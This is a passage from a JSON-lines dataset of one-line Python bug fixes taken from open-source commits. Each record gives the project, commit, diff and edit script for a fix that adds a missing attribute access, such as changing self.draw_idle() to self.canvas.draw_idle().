\"N0\"], 0], [\"Insert\", [\"attribute\", 2, 40, 2, 46], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:tf\", 2, 40, 2, 42], 0], [\"Move\", \"N0\", [\".:.\", 2, 42, 2, 43], 1], [\"Insert\", \"N0\", [\"identifier:math\", \"T\"], 2]]"}
{"project": "foxtail", "commit_sha": "f7931dd74d12fc30f90021fe3beb424ef2400206", "parent_sha": "7070acbaf3ce7904434dd17ef9c71a56c8b1ea1e", "file_path": "apps/accounts/forms.py", "project_url": "https://github.com/dmptrluke/foxtail", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -50,7 +50,7 @@ def __init__(self, *args, **kwargs):\n         self.helper.disable_csrf = True\n         self.helper.error_text_inline = False\n         self.helper.help_text_inline = False\n-        self.use_custom_control = True\n+        self.helper.use_custom_control = True\n \n         self.helper.layout = Layout(\n             Field('login', autocomplete='username'),\n", "before": "self . use_custom_control = True", "after": "self . helper . use_custom_control = True", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 9, 3, 32], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 32], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 9, 3, 13], 0], [\"Move\", \"N0\", [\".:.\", 3, 13, 3, 14], 1], [\"Insert\", \"N0\", [\"identifier:helper\", \"T\"], 2]]"}
{"project": "bda.recipe.deployment", "commit_sha": "4417f896c421397cb8db04e8123cff024ba134e2", "parent_sha": "20c4a063b729e0b88554b6e97bb5734c78ba7ed9", "file_path": "src/bda/recipe/deployment/common.py", "project_url": "https://github.com/bluedynamics/bda.recipe.deployment", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -450,4 +450,4 @@ class DeploymentPackage(object):\n \n     @property\n     def branch_name(self):\n-        return self.branch_name\n+        return self.config.branch_name\n", "before": "return self . branch_name", "after": "return self . config . branch_name", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 16, 3, 32], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 16, 3, 32], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 16, 3, 20], 0], [\"Move\", \"N0\", [\".:.\", 3, 20, 3, 21], 1], [\"Insert\", \"N0\", [\"identifier:config\", \"T\"], 2]]"}
{"project": "ulearn.core", "commit_sha": "86f0f243a2af43d93183c483c2fbd4b867e57d74", "parent_sha": "157bc4237271040868b18f8ea2faf9899c0e9a66", "file_path": "ulearn/core/browser/stats.py", "project_url": "https://github.com/UPCnet/ulearn.core", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -282,7 +282,7 @@ class MaxStats(object):\n         \"\"\"\n         \"\"\"\n         if filters['community']:\n-            endpoint = self.contexts[filters['community']].comments\n+            endpoint = self.maxclient.contexts[filters['community']].comments\n         else:\n             endpoint = self.maxclient.activities.comments\n \n", "before": "endpoint = self . contexts [ filters [ 'community' ] ] . comments", "after": "endpoint = self . maxclient . contexts [ filters [ 'community' ] ] . comments", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 24, 3, 37], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 24, 3, 37], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 24, 3, 28], 0], [\"Move\", \"N0\", [\".:.\", 3, 28, 3, 29], 1], [\"Insert\", \"N0\", [\"identifier:maxclient\", \"T\"], 2]]"}
{"project": "anaconda-build", "commit_sha": "a244b41bc5f11547dda1fde0336337742a57bee3", "parent_sha": "80c83d9b8c915cfe1e23cb174596e9d63d0b2fd4", "file_path": "binstar_build_client/commands/register.py", "project_url": "https://github.com/Anaconda-Platform/anaconda-build", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -55,7 +55,7 @@ def split_queue_arg(queue):\n \n def main(args):\n     if not args.output:\n-        args.output = tempfile.NamedTemporaryFile(delete=False)\n+        args.output = tempfile.NamedTemporaryFile(delete=False).name\n     args.username, args.queue = split_queue_arg(args.queue)\n     bs = get_binstar(args, cls=BinstarBuildAPI)\n     return register_worker(bs, args)\n", "before": "args . output = tempfile . NamedTemporaryFile ( delete = False )", "after": "args . output = tempfile . NamedTemporaryFile ( delete = False ) . name", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 64], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"call\", 3, 23, 3, 64], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "revizor-tests", "commit_sha": "bd360e93a29ad65235f4079543d36866c16328ef", "parent_sha": "8c8dec60639a44dfaa25b740168e4510a001d8ec", "file_path": "functional/terrain/node_terrain.py", "project_url": "https://github.com/Scalr/revizor-tests", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -950,7 +950,7 @@ def given_server_in_cloud(step, user_data):\n     if CONF.feature.dist.is_windows:\n         table = tables('images-clean')\n         search_cond = dict(\n-            dist=CONF.feature.dist,\n+            dist=CONF.feature.dist.id,\n             platform=CONF.feature.platform)\n         image = table.filter(search_cond).first().keys()[0].encode('ascii', 'ignore')\n     node = world.cloud.create_node(userdata=user_data, use_hvm=CONF.feature.use_vpc, image=image)\n", "before": "search_cond = dict ( dist = CONF . feature . dist , platform = CONF . feature . platform )", "after": "search_cond = dict ( dist = CONF . feature . dist . id , platform = CONF . feature . platform )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 18, 3, 35], [\"attribute\", 3, 18, 3, 35], 0], [\"Insert\", [\"attribute\", 3, 18, 3, 35], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 18, 3, 35], [\"identifier:id\", \"T\"], 2]]"}
{"project": "revizor-tests", "commit_sha": "0303020fc168528198a2145631c9c9bdd67a8d0a", "parent_sha": "f406fdabacb77c371b4617dd960b0b9ea15150fa", "file_path": "functional/webservices/steps/haproxy_steps.py", "project_url": "https://github.com/Scalr/revizor-tests", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -151,7 +151,7 @@ def verify_backends_for_port(step, serv_as, port, has_not, backends_servers):\n                     break\n         else:\n             if not has_not:\n-                raise AssertionError(\"Backend '%s' not found in backends (%s) file for port '%s'\" % (backend, config['backends'][port], port))\n+                raise AssertionError(\"Backend '%s' not found in backends (%s) file for port '%s'\" % (backend.pattern, config['backends'][port], port))\n \n \n @step(r'([\\w\\d]+) listen list should contains backend for (\\d+) port')\n", "before": "else : if not has_not : raise AssertionError ( \"Backend '%s' not found in backends (%s) file for port '%s'\" % ( backend , config [ 'backends' ] [ port ] , port ) )", "after": "else : if not has_not : raise AssertionError ( \"Backend '%s' not found in backends (%s) file for port '%s'\" % ( backend . pattern , config [ 'backends' ] [ port ] , port ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"tuple\", 3, 101, 3, 142], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:backend\", 3, 102, 3, 109], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:pattern\", \"T\"], 2]]"}
{"project": "python-dateutil", "commit_sha": "186cff2b07c56d5782c4a8b29a7209be9beeaa82", "parent_sha": "62886a0196a84aaf385115b202a7c6b3b5d65409", "file_path": "updatezinfo.py", "project_url": "https://github.com/sprymix/python-dateutil", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -26,7 +26,7 @@ def main():\n         sha_512_file = sha_hasher.hexdigest()\n         assert metadata['tzdata_file_sha512'] == sha_512_file, \"SHA failed for\"\n     print(\"Updating timezone information...\")\n-    rebuild(metadata['tzdata_file'], zonegroups=metadata['zonegroups'],\n+    rebuild.rebuild(metadata['tzdata_file'], zonegroups=metadata['zonegroups'],\n             metadata=metadata)\n     print(\"Done.\")\n \n", "before": "rebuild ( metadata [ 'tzdata_file' ] , zonegroups = metadata [ 'zonegroups' ] , metadata = metadata )", "after": "rebuild . rebuild ( metadata [ 'tzdata_file' ] , zonegroups = metadata [ 'zonegroups' ] , metadata = metadata )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 5, 4, 31], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:rebuild\", 3, 5, 3, 12], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:rebuild\", \"T\"], 2]]"}
{"project": "osg-test", "commit_sha": "e1d9547965dd2fd755e74843e5cbaae7cea68a79", "parent_sha": "dd020d019a6844cc7cc116581a9f8fd1efd7d96a", "file_path": "osgtest/tests/special_install.py", "project_url": "https://github.com/opensciencegrid/osg-test", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -15,7 +15,7 @@ class TestInstall(osgunittest.OSGTestCase):\n             core.check_system(pre + ('osg-release',), 'Verify osg-release')\n         except AssertionError:\n             core.check_system(pre + ('osg-release-itb',), 'Verify osg-release + osg-release-itb')\n-        core.config['install.original-release-ver'] = core.osg_release()\n+        core.config['install.original-release-ver'] = core.osg_release().version\n \n     def test_02_install_packages(self):\n         core.state['install.success'] = False\n", "before": "core . config [ 'install.original-release-ver' ] = core . osg_release ( )", "after": "core . config [ 'install.original-release-ver' ] = core . osg_release ( ) . version", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 3, 9, 3, 73], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"call\", 3, 55, 3, 73], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:version\", \"T\"], 2]]"}
{"project": "zipline", "commit_sha": "a07c94665b9669a200a3eed5c3f730c8ac70e3b8", "parent_sha": "cfe6296a3e0a1cd358158425321c192840476fd3", "file_path": "zipline/gens/tradesimulation.py", "project_url": "https://github.com/jeremyblow/zipline", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -195,7 +195,7 @@ class AlgorithmSimulator(object):\n                                     )\n                                 self.algo.perf_tracker.handle_intraday_close()\n \n-                    self.portfolio_needs_update = True\n+                    self.algo.portfolio_needs_update = True\n \n             risk_message = self.algo.perf_tracker.handle_simulation_end()\n             yield risk_message\n", "before": "self . portfolio_needs_update = True", "after": "self . algo . portfolio_needs_update = True", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 21, 3, 48], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 21, 3, 48], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 21, 3, 25], 0], [\"Move\", \"N0\", [\".:.\", 3, 25, 3, 26], 1], [\"Insert\", \"N0\", [\"identifier:algo\", \"T\"], 2]]"}
{"project": "searx", "commit_sha": "41aca9a068cbaf4e630461b844a152e7f2444548", "parent_sha": "0f4cb32bf176f234dd743729f7e785b3b4215854", "file_path": "searx/webapp.py", "project_url": "https://github.com/MarcAbonce/searx", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -402,7 +402,7 @@ def autocompleter():\n \n     # return autocompleter results\n     if request_data.get('format') == 'x-suggestions':\n-        return Response(json.dumps([query, results]),\n+        return Response(json.dumps([query.query, results]),\n                         mimetype='application/json')\n     else:\n         return Response(json.dumps(results),\n", "before": "return Response ( json . dumps ( [ query , results ] ) , mimetype = 'application/json' )", "after": "return Response ( json . dumps ( [ query . query , results ] ) , mimetype = 'application/json' )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"list\", 3, 36, 3, 52], [\"attribute\", \"N0\"], 1], [\"Move\", \"N0\", [\"identifier:query\", 3, 37, 3, 42], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:query\", \"T\"], 2]]"}
{"project": "matplotlib", "commit_sha": "a9162f50231a9bb9be3cf2278d68b55afe011b24", "parent_sha": "c001797cd2868f53c2014eb441af5a73df195139", "file_path": "lib/matplotlib/backend_bases.py", "project_url": "https://github.com/story645/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3146,7 +3146,7 @@ class NavigationToolbar2(object):\n             a.set_position(pos[i][0], 'original')\n             a.set_position(pos[i][1], 'active')\n \n-        self.draw_idle()\n+        self.canvas.draw_idle()\n \n     def save_figure(self, *args):\n         \"\"\"Save the current figure\"\"\"\n", "before": "self . draw_idle ( )", "after": "self . canvas . draw_idle ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 9, 3, 23], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 23], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 9, 3, 13], 0], [\"Move\", \"N0\", [\".:.\", 3, 13, 3, 14], 1], [\"Insert\", \"N0\", [\"identifier:canvas\", \"T\"], 2]]"}
{"project": "matplotlib", "commit_sha": "0043c3b04ca225c9013abbce651783cc83620c35", "parent_sha": "a84654a79c86ae2f27c8e2eb736945f60f08364e", "file_path": "lib/matplotlib/backend_bases.py", "project_url": "https://github.com/story645/matplotlib", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -3146,7 +3146,7 @@ class NavigationToolbar2(object):\n             a.set_position(pos[i][0], 'original')\n             a.set_position(pos[i][1], 'active')\n \n-        self.draw_idle()\n+        self.canvas.draw_idle()\n \n     def save_figure(self, *args):\n         \"\"\"Save the current figure\"\"\"\n", "before": "self . draw_idle ( )", "after": "self . canvas . draw_idle ( )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 9, 3, 23], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 23], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 9, 3, 13], 0], [\"Move\", \"N0\", [\".:.\", 3, 13, 3, 14], 1], [\"Insert\", \"N0\", [\"identifier:canvas\", \"T\"], 2]]"}
{"project": "iterative-Random-Forest", "commit_sha": "729cb501d7c73a29a2d00eeffef5901916b45a5a", "parent_sha": "b6f4de56fbdc841aa406e8bc29bb99c4195ba674", "file_path": "sklearn/tree/tree.py", "project_url": "https://github.com/Yu-Group/iterative-Random-Forest", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -539,7 +539,7 @@ class DecisionTreeClassifier(BaseDecisionTree, ClassifierMixin):\n                              \" input n_features is %s \"\n                              % (self.n_features, n_features))\n \n-        P = self.tree(X)\n+        P = self.tree.predict(X)\n         P /= P.sum(axis=1)[:, np.newaxis]\n         return P\n \n", "before": "P = self . tree ( X )", "after": "P = self . tree . predict ( X )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 13, 3, 22], [\"attribute\", 3, 13, 3, 22], 0], [\"Insert\", [\"attribute\", 3, 13, 3, 22], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 13, 3, 22], [\"identifier:predict\", \"T\"], 2]]"}
{"project": "cpymad", "commit_sha": "42f12671e25fb13ffb3997cd9fb8d097a66a1fce", "parent_sha": "da376bbe575d6887ad897d7203ba50f10b6bd493", "file_path": "cpymad/madx.py", "project_url": "https://github.com/hibtc/cpymad", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -425,7 +425,7 @@ class Madx(object):\n             active_sequence = None\n         else:\n             if not sequence:\n-                sequence = active_sequence\n+                sequence = active_sequence.name\n         if (sequence != active_sequence\n                 or not self._libmadx.is_sequence_expanded(sequence)):\n             self.use(sequence)\n", "before": "else : if not sequence : sequence = active_sequence", "after": "else : if not sequence : sequence = active_sequence . name", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"assignment\", 1, 9, 3, 43], [\"attribute\", \"N0\"], 5], [\"Move\", \"N0\", [\"identifier:active_sequence\", 3, 28, 3, 43], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "mangrove", "commit_sha": "5f3e6ff8433fbcbd0ae440d3cc9556b3629a5704", "parent_sha": "82b6d3a497543c067f25fe73305d7dddec4db0f3", "file_path": "mangrove/transport/services/MediaSubmissionService.py", "project_url": "https://github.com/mangroveorg/mangrove", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -38,7 +38,7 @@ class MediaSubmissionService():\n             if field.is_field_set:\n                 for value in values:\n                     media_files.update(\n-                        self._get_media_fields_and_update_values(field.fields, value(field.code, []), counter))\n+                        self._get_media_fields_and_update_values(field.fields, value.get(field.code, []), counter))\n             elif isinstance(field, MediaField):\n                 for value in values:\n                     old_name = value.get(field.code)\n", "before": "media_files . update ( self . _get_media_fields_and_update_values ( field . fields , value ( field . code , [ ] ) , counter ) )", "after": "media_files . update ( self . _get_media_fields_and_update_values ( field . fields , value . get ( field . code , [ ] ) , counter ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 80, 3, 101], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:value\", 3, 80, 3, 85], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:get\", \"T\"], 2]]"}
{"project": "biostar-central", "commit_sha": "2294d7371576d0281d09362296de94d1daaf597c", "parent_sha": "9c7b487155da0b0fb947e8b2ae99d9cbbe2ed841", "file_path": "main/server/models.py", "project_url": "https://github.com/meraki/biostar-central", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -622,7 +622,7 @@ def post_score_change(post, amount=1):\n \n def user_score_change(post, amount):\n     \"How user score changes with votes\"\n-    if post.type == POST_POLL:\n+    if post.root.type == POST_POLL:\n         return\n     user = post.author\n     user.profile.score += amount\n", "before": "if post . type == POST_POLL : return", "after": "if post . root . type == POST_POLL : return", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 8, 3, 17], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 8, 3, 17], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:post\", 3, 8, 3, 12], 0], [\"Move\", \"N0\", [\".:.\", 3, 12, 3, 13], 1], [\"Insert\", \"N0\", [\"identifier:root\", \"T\"], 2]]"}
{"project": "Multicorn", "commit_sha": "744d72e42d2a1f304c883231b48f211e4c47d543", "parent_sha": "bac3c0b17fa2ec4f1084a3549cd7fd54bf9912c6", "file_path": "kalamar/access_point/alchemy/__init__.py", "project_url": "https://github.com/eligoenergy/Multicorn", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -233,7 +233,7 @@ class Alchemy(AccessPoint):\n             statement = self._table.insert().values(value).execute()\n             for (gen_id, id_prop) in zip(statement.inserted_primary_key, \n                     self.identity_properties):\n-                item[id_prop] = gen_id \n+                item[id_prop.name] = gen_id \n             transaction.commit()\n         except:\n             try:\n", "before": "item [ id_prop ] = gen_id", "after": "item [ id_prop . name ] = gen_id", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"subscript\", 3, 17, 3, 30], [\"attribute\", \"N0\"], 2], [\"Move\", \"N0\", [\"identifier:id_prop\", 3, 22, 3, 29], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:name\", \"T\"], 2]]"}
{"project": "Minecraft-Overviewer", "commit_sha": "834598da0fb1cf4e12b75a4f38b008f997663bf1", "parent_sha": "ce214c19bc08a2002a3959d4d7e0bb2e8aa191ea", "file_path": "overviewer_core/assetmanager.py", "project_url": "https://github.com/SkyPrayerStudio/Minecraft-Overviewer", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -92,7 +92,7 @@ directory.\n         dump['worlds'] = worlds\n         dump['map'] = dict()\n         dump['map']['debug'] = True\n-        dump['map']['cacheTag'] = str(int(time()))\n+        dump['map']['cacheTag'] = str(int(time.time()))\n         dump['map']['north_direction'] = 'lower-left' # only temporary\n         dump['map']['center'] = [-314, 67, 94]\n         dump['map']['controls'] = {\n", "before": "dump [ 'map' ] [ 'cacheTag' ] = str ( int ( time ( ) ) )", "after": "dump [ 'map' ] [ 'cacheTag' ] = str ( int ( time . time ( ) ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 43, 3, 49], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:time\", 3, 43, 3, 47], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:time\", \"T\"], 2]]"}
{"project": "twisted", "commit_sha": "a7f55d3d84feaee3bac062ec7c971a5c2cea4247", "parent_sha": "535d09262c30d8f7ca98a7b9e414beadf70253e5", "file_path": "twisted/web/distrib.py", "project_url": "https://github.com/alex-com/twisted", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -145,7 +145,7 @@ class ResourcePublisher(pb.Root, styles.Versioned):\n     persistenceVersion = 2\n \n     def upgradeToVersion2(self):\n-        self.application.removeIdentity(\"web\")\n+        self.application.authorizer.removeIdentity(\"web\")\n         del self.application.services[self.serviceName]\n         del self.serviceName\n         del self.application\n", "before": "self . application . removeIdentity ( \"web\" )", "after": "self . application . authorizer . removeIdentity ( \"web\" )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Move\", [\"attribute\", 3, 9, 3, 25], [\"attribute\", 3, 9, 3, 25], 0], [\"Insert\", [\"attribute\", 3, 9, 3, 25], [\".:.\", \"T\"], 1], [\"Insert\", [\"attribute\", 3, 9, 3, 25], [\"identifier:authorizer\", \"T\"], 2]]"}
{"project": "biostar-central", "commit_sha": "07a788a8e7a98e8a3a577cd884f4d31c0ee90923", "parent_sha": "9309548e1ea1b084a3b2ab01030833d58908b808", "file_path": "biostar/server/models.py", "project_url": "https://github.com/meraki/biostar-central", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -64,7 +64,7 @@ def post_create_messages(sender, instance, created, *args, **kwargs):\n         email_html = html.render(name=POST_CREATED_HTML, post=post, user=author, site=site)\n \n         # Create the message body.\n-        body = MessageBody.objects.create(author=author, subject=post.title,\n+        body = MessageBody.objects.create(author=author, subject=post.root.title,\n                                           text=content, sent_at=post.creation_date)\n \n         # Collects the emails for bulk sending.\n", "before": "body = MessageBody . objects . create ( author = author , subject = post . title , text = content , sent_at = post . creation_date )", "after": "body = MessageBody . objects . create ( author = author , subject = post . root . title , text = content , sent_at = post . creation_date )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 66, 3, 76], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 66, 3, 76], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:post\", 3, 66, 3, 70], 0], [\"Move\", \"N0\", [\".:.\", 3, 70, 3, 71], 1], [\"Insert\", \"N0\", [\"identifier:root\", \"T\"], 2]]"}
{"project": "eve-wspace", "commit_sha": "554a084f241a30a70dd202f51c41f2772bed5020", "parent_sha": "c91c40d60c3940ac1ad62b9eaa77a6812b614cbd", "file_path": "evewspace/Map/models.py", "project_url": "https://github.com/jobava-eve/eve-wspace", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -262,7 +262,7 @@ class Map(models.Model):\n         #Done this way there should only be one db hit which gets all relevant\r\n         #permissions\r\n         for perm in self.grouppermissions.filter(group__in=groups):\r\n-            highestperm = max(highestperm, perm)\r\n+            highestperm = max(highestperm, perm.access)\r\n \r\n         return highestperm\r\n \r\n", "before": "highestperm = max ( highestperm , perm )", "after": "highestperm = max ( highestperm , perm . access )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"argument_list\", 3, 30, 3, 49], [\"attribute\", \"N0\"], 3], [\"Move\", \"N0\", [\"identifier:perm\", 3, 44, 3, 48], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:access\", \"T\"], 2]]"}
{"project": "pyethereum", "commit_sha": "221efdf39ddafb0ef7acd6b055fb161a0edbcbe2", "parent_sha": "f96054ca99ddd6b246dac9715053d9a68640d1f6", "file_path": "pyethereum/blocks.py", "project_url": "https://github.com/ethermarket/pyethereum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -1166,7 +1166,7 @@ class Block(rlp.Serializable):\n     @property\n     def mining_hash(self):\n         return utils.sha3(rlp.encode(self.header,\n-                                     BlockHeader(['nonce', 'mixhash'])))\n+                                     BlockHeader.exclude(['nonce', 'mixhash'])))\n \n     def hex_hash(self):\n         return self.hash.encode('hex')\n", "before": "return utils . sha3 ( rlp . encode ( self . header , BlockHeader ( [ 'nonce' , 'mixhash' ] ) ) )", "after": "return utils . sha3 ( rlp . encode ( self . header , BlockHeader . exclude ( [ 'nonce' , 'mixhash' ] ) ) )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 38, 3, 71], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:BlockHeader\", 3, 38, 3, 49], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:exclude\", \"T\"], 2]]"}
{"project": "pyethereum", "commit_sha": "cb5479e18103afaeced61c4feff3944cb95807a8", "parent_sha": "51e1bed7dd2894927c85c03954828a4c3d6e91d7", "file_path": "pyethereum/vm.py", "project_url": "https://github.com/ethermarket/pyethereum", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -161,7 +161,7 @@ def vm_execute(ext, msg, code):\n             if op[:4] == 'PUSH':\n                 trace_data['pushvalue'] = pushval\n \n-            log_vm_op('vm', **trace_data)\n+            log_vm_op.trace('vm', **trace_data)\n \n         if opcode < 0x10:\n             if op == 'STOP':\n", "before": "log_vm_op ( 'vm' , ** trace_data )", "after": "log_vm_op . trace ( 'vm' , ** trace_data )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"call\", 3, 13, 3, 42], [\"attribute\", \"N0\"], 0], [\"Move\", \"N0\", [\"identifier:log_vm_op\", 3, 13, 3, 22], 0], [\"Insert\", \"N0\", [\".:.\", \"T\"], 1], [\"Insert\", \"N0\", [\"identifier:trace\", \"T\"], 2]]"}
{"project": "kivy", "commit_sha": "529294bc87eec54b12e1d3d3af955472de29610d", "parent_sha": "324a1fff0bcf1c22f52989503e0db8ac0b9c0420", "file_path": "kivy/uix/image.py", "project_url": "https://github.com/jofomah/kivy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -214,7 +214,7 @@ class Image(Widget):\n             return\n         self._coreimage.anim_delay = value\n         if value < 0:\n-            self.anim_reset(False)\n+            self._coreimage.anim_reset(False)\n \n     def on_texture(self, instance, value):\n         if value is not None:\n", "before": "self . anim_reset ( False )", "after": "self . _coreimage . anim_reset ( False )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 13, 3, 28], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 13, 3, 28], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 13, 3, 17], 0], [\"Move\", \"N0\", [\".:.\", 3, 17, 3, 18], 1], [\"Insert\", \"N0\", [\"identifier:_coreimage\", \"T\"], 2]]"}
{"project": "kivy", "commit_sha": "927bbe9c91f908933d57b1f415e29f43b928d4dc", "parent_sha": "c48456cad4be9e56e92a34c2ab1f3f10b1acf52d", "file_path": "kivy/core/window/__init__.py", "project_url": "https://github.com/jofomah/kivy", "likely_bug": true, "comodified": false, "in_function": true, "diff": "@@ -518,7 +518,7 @@ class WindowBase(EventDispatcher):\n                 # on other platform, window are recreated, we need to reload.\n                 from kivy.graphics.context import get_context\n                 get_context().reload()\n-                Clock.schedule_once(lambda x: self.ask_update(), 0)\n+                Clock.schedule_once(lambda x: self.canvas.ask_update(), 0)\n \n         # ensure the gl viewport is correct\n         self.update_viewport()\n", "before": "Clock . schedule_once ( lambda x : self . ask_update ( ) , 0 )", "after": "Clock . schedule_once ( lambda x : self . canvas . ask_update ( ) , 0 )", "sstub_pattern": "ADD_ATTRIBUTE_ACCESS", "edit_script": "[[\"Insert\", [\"attribute\", 3, 47, 3, 62], [\"attribute\", \"N0\"], 0], [\"Insert\", [\"attribute\", 3, 47, 3, 62], [\".:.\", \"T\"], 1], [\"Move\", \"N0\", [\"identifier:self\", 3, 47, 3, 51], 0], [\"Move\", \"N0\", [\".:.\", 3, 51, 3, 52], 1], [\"Insert\", \"N0\", [\"identifier:canvas\", \"T\"], 2]]"}
